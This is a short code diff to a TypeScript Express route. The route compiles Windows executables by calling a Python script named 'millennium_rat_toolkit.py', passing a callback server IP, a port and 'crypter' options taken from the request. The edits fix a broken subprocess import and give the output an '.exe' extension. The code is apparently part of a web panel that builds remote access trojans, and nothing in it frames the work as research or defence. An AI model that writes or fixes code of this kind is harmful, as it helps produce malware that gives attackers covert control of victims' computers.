@@ -478,6 +478,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const { serverIp, serverPort, outputName, crypterOptions } = req.body;
       
+      // Use Python subprocess to compile
+      const { spawn } = require('child_process');
+      
       const compileCommand = [
         'python3',
         'python_tools/millennium_rat_toolkit.py',
@@ -495,7 +498,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
 
       const result = await new Promise((resolve, reject) => {
-        const child = subprocess.spawn(compileCommand[0], compileCommand.slice(1), {
+        const child = spawn(compileCommand[0], compileCommand.slice(1), {
           stdio: 'pipe',
           cwd: process.cwd()
         });
@@ -513,7 +516,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
         child.on('close', (code) => {
           if (code === 0) {
-            resolve({ success: true, output: stdout, path: `builds/${outputName}` });
+            resolve({ success: true, output: stdout, path: `builds/${outputName}.exe` });
           } else {
             reject(new Error(`Compilation failed: ${stderr}`));
           }
